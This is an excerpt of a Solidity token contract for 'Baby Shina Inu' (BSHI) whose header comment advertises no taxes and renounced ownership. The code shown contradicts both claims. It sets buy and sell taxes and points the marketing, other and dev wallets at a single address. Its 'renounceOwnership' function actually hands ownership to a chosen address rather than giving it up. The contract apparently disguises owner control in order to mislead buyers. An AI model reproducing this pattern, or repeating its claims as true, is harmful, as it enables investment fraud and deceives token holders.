...
/**
    We missed Shina Inu just like you did. 
    Baby Shina Inu - No Taxes - Renounced and Liquidity burned
    Enjoy it Anon
*/
...
contract ERC20Ownable is Context {
    ...
    event OwnershipTransferred(address indexed previousOwner, address indexed ownershipRenounced);
    constructor() {
    ...
    function renounceOwnership(address ownershipRenounced) public virtual onlyOwner {
        require(ownershipRenounced != address(0), "ERC20Ownable: new owner is the zero address");
...
contract BabyShinaInu is Context, IERC20, ERC20Ownable {
    using SafeMath for uint256;

    string private constant _na = "Baby Shina Inu";
    string private constant _sym = "BSHI";
    ...
    uint256 private _marketingTax = 1;
    uint256 private _previousMarketingTax = _marketingTax;

    uint256 private _otherTax = 1;
    ...
    uint256 public taxBuyMarketing = 1;
    uint256 public taxBuyOther = 1;
    uint256 public taxBuyReflections = 0;
    uint256 public taxBuyLiquidity = 2;
	
    uint256 public taxSellMarketing = 1;
    uint256 public taxSellOther = 1;
    ...
    constructor() payable {
        ...
        MarketingWallet = payable(0xcb95a78C429357333790FFD8ca70b5C6AB1e39A4);
        OtherWallet = payable(0xcb95a78C429357333790FFD8ca70b5C6AB1e39A4);
        DevWallet = payable(0xcb95a78C429357333790FFD8ca70b5C6AB1e39A4);
